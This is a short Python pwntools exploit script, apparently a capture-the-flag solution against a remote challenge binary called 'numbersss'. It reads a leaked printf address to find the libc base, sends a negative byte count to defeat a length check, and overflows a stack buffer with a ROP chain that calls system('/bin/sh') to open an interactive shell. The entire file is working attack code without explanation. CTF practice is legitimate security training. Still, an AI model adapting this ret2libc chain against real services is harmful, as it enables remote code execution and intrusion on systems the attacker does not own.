from pwn import *

elf = context.binary = ELF('./numbersss')
libc = ELF('./libc.so.6')

#p = process('./numbersss')
p = remote('numbersss.chal.cyberjousting.com', 1351)
#gdb.attach(p, 'b *vuln+201\ncontinue\n')

p.recvuntil(b'Free junk: ')
printf = int(p.recvuntil(b'\n').strip(),16)
log.info("Printf Address: {}".format(hex(printf)))

offset = 24
length = 129

libc.address = printf - libc.sym['printf']
log.info(hex(libc.address))

rop = ROP(libc)
rop.call((rop.find_gadget(["ret"])))
rop.call((rop.find_gadget(["pop rdi", "ret"]))[0])
rop.call(next(libc.search(b'/bin/sh\x00')))
rop.call(libc.sym['system'])

raw_rop = rop.chain()
print(len(raw_rop))

p.sendlineafter(b'How many bytes do you want to read in?', b'-127')
p.sendline(b'A' * offset + raw_rop  + (b'A'*(length-offset-len(raw_rop))))
p.interactive()